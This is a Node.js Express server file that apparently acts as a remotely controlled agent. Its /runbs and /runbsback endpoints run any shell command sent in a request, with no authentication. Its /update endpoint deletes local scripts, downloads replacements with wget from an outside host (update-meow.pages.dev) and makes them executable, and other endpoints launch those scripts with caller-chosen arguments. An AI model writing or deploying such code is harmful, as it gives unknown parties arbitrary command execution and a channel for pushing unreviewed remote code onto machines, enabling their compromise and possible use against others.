const { spawn, exec } = require('child_process');
const express = require("express");
let proc;
const app = express();
const fs = require("fs")
app.use(express.json());
app.get("/",function(req,res){
  res.send("x")
})
app.post("/thingy", (req, res) => {
    try {
  console.log(req.body.x)
    try {
        proc.kill()
    } catch(error){}

    proc = spawn('./test.js', [req.body.x])
    
    res.send("ok")
    }catch(err){res.send("error happened")}
})
app.post("/update", (req,res)=>{
  exec("rm -rf test.js", ()=>{
    exec("wget https://update-meow.pages.dev/test.js && chmod +x ./test.js", (error, stdout, stderr)=>{
      res.send(stdout)
    })
  })
  exec("rm -rf main.js", ()=>{
    exec("wget https://update-meow.pages.dev/main.js && chmod +x ./main.js", ()=>{
    })
  })
})
app.post("/runbs", (req,res)=>{
  const command = req.body.x;

  exec(command, (error, stdout, stderr) => {
    if (error) {
      console.error(`exec error: ${error}`);
      res.send({error: error})
      return;
    }
    res.send({output: stdout})
  });
})
app.post("/runbsback", (req,res)=>{
  const command = req.body.x;

  exec(command, (error, stdout, stderr) => {
    if (error) {
      console.error(`exec error: ${error}`);
      return;
    }
  });
  res.send({output: "ok"})
})
app.post("/mainjs",(req,res)=>{
  if(!req.body.argz || !req.body.time){
    return res.send("error")
  }
  proc = spawn("./main.js", req.body.argz)
  setTimeout(()=>{
    proc.kill();
  }, req.body.time)
  res.send("ran")
})
app.post("/kill", (req, res) => {
    try{
  try {
    proc.kill()
  } catch(error){}
  exec("pkill test.js")
  res.send("ok")
  }catch(err){res.send("error happened")}
})


app.listen("8080")
